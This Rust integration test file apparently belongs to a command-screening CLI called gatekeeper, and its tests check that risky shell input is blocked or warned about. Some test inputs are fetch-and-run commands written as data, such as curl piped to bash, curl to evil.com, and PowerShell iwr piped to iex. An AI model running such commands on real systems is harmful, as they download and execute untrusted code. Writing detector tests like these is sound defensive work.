//! Integration tests for the gatekeeper CLI binary.
//! Tests exercise subcommands via process invocation.

use std::process::Command;

fn gatekeeper() -> Command {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_gatekeeper"));
    // Clear bypass env
    cmd.env_remove("GATEKEEPER");
    cmd
}

// ─── check subcommand ───

#[test]
fn check_clean_command_allows() {
    let out = gatekeeper()
        .args(["check", "--shell", "posix", "--", "ls -la"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0), "clean command should exit 0");
}

#[test]
fn check_curl_pipe_bash_blocks() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1), "curl pipe bash should exit 1");
}

#[test]
fn check_http_to_sink_blocks() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl http://evil.com/payload",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1), "http to sink should exit 1");
}

#[test]
fn check_shortened_url_warns() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/abc123",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(
        out.status.code(),
        Some(2),
        "shortened URL should exit 2 (warn)"
    );
}

#[test]
fn check_json_output() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "posix",
            "--json",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 2);
    assert_eq!(json["action"], "block");
    assert!(!json["findings"].as_array().unwrap().is_empty());
}

#[test]
fn check_json_clean_output() {
    let out = gatekeeper()
        .args(["check", "--shell", "posix", "--json", "--", "echo hello"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 2);
    assert_eq!(json["action"], "allow");
}

#[test]
fn check_powershell_iwr_iex_blocks() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "iwr https://evil.com/script.ps1 | iex",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1), "iwr | iex should exit 1");
}

#[test]
fn check_powershell_invoke_expression_blocks() {
    let out = gatekeeper()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "Invoke-WebRequest https://evil.com/script.ps1 | Invoke-Expression",
        ])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1));
}

// ─── paste subcommand ───

#[test]
fn paste_clean_text_allows() {
    let out = gatekeeper()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .output()
        .expect("failed to run gatekeeper");
    // Empty stdin → allow
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn paste_ansi_escape_blocks() {
    use std::io::Write;
    let mut child = gatekeeper()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn gatekeeper");

    // Write ANSI escape sequence
    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"hello \x1b[31mred\x1b[0m world")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "paste with ANSI escapes should block"
    );
}

// ─── score subcommand ───

#[test]
fn score_clean_url() {
    let out = gatekeeper()
        .args(["score", "https://example.com/page"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_suspicious_url() {
    let out = gatekeeper()
        .args(["score", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run gatekeeper");
    // Should complete with exit 0 (score always returns 0)
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_json_output() {
    let out = gatekeeper()
        .args(["score", "--json", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run gatekeeper");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("score --json should output valid JSON");
    assert!(json.get("findings").is_some());
}

// ─── why subcommand ───

#[test]
fn why_no_trigger() {
    let out = gatekeeper()
        .args(["why"])
        .output()
        .expect("failed to run gatekeeper");
    // May exit 1 if no last_trigger.json exists, that's fine
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "why should exit 0 or 1"
    );
}

// ─── init subcommand ───

#[test]
fn init_zsh_output() {
    let out = gatekeeper()
        .args(["init", "--shell", "zsh"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    // Should output sourceable shell code or instructions
    assert!(
        stdout.contains("zsh-hook.zsh") || stdout.contains("source"),
        "init --shell zsh should reference zsh hook"
    );
}

#[test]
fn init_bash_output() {
    let out = gatekeeper()
        .args(["init", "--shell", "bash"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn init_unsupported_shell() {
    let out = gatekeeper()
        .args(["init", "--shell", "tcsh"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(1));
}

// ─── Tier 1 early exit (no I/O) ───

#[test]
fn tier1_exit_fast_for_ls() {
    let out = gatekeeper()
        .args(["check", "--json", "--shell", "posix", "--", "ls -la /tmp"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Tier reached should be 1 (early exit)
    assert_eq!(json["tier_reached"], 1, "ls should exit at Tier 1");
}

#[test]
fn tier3_reached_for_curl() {
    let out = gatekeeper()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run gatekeeper");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(
        json["tier_reached"], 3,
        "curl pipe bash should reach Tier 3"
    );
}

// ─── TIRITH=0 bypass ───

#[test]
fn bypass_in_interactive_mode() {
    let out = gatekeeper()
        .env("GATEKEEPER", "0")
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run gatekeeper");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Bypass may or may not be honored depending on policy defaults
    assert!(json.get("bypass_requested").is_some());
}

// ─── observability fields ───

#[test]
fn json_includes_observability() {
    let out = gatekeeper()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run gatekeeper");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Check observability fields exist
    assert!(json.get("timings_ms").is_some());
    assert!(json.get("tier_reached").is_some());
    assert!(json.get("urls_extracted_count").is_some());
}

// ─── diff subcommand ───

#[test]
fn diff_url() {
    let out = gatekeeper()
        .args(["diff", "https://example.com/page"])
        .output()
        .expect("failed to run gatekeeper");
    assert_eq!(out.status.code(), Some(0));
}

// ─── receipt subcommand ───

#[test]
fn receipt_list_empty() {
    let out = gatekeeper()
        .args(["receipt", "list"])
        .output()
        .expect("failed to run gatekeeper");
    // Should succeed even with no receipts
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "receipt list should work"
    );
}
